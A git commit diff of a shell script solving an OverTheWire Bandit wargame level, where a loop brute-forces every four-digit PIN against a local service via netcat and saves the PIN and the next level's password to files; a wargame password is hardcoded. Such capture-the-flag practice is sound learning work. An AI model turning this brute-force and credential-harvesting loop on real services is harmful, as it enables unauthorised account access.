aabaabc6fc09b996318913d93b976233457f21c2
TheUsualKumar <nilesh.guptain@gmail.com>
2020-01-06 11:07:03 +0530

    writing creds to files; changed key space

--- bandit25_brute-PIN.sh
+++ bandit25_brute-PIN.sh
@@ -1,15 +1,15 @@
 #!/bin/bash
 
-for pin in {3714..3716}; do
+for pin in {0000..9999}; do
 echo "trying $pin..."
 echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $pin" | nc localhost 30002 | grep 'Wrong' &> /dev/null
 if [ $? == 0 ]; then
         echo "incorrect!"
 else
         echo "found correct PIN: $pin"
-        echo "$pin" >> bandit25-login-creds.txt
+        echo "$pin" >> bandit25-PIN.txt
         echo -n "password of user bandit25: "
-        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $pin" | nc localhost 30002 | grep 'password of user bandit25' | awk '{print $7}'
+        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $pin" | nc localhost 30002 | grep 'password of user bandit25' | awk '{print $7}' | tee -a bandit25-password.txt
         break
 fi
 sleep 2
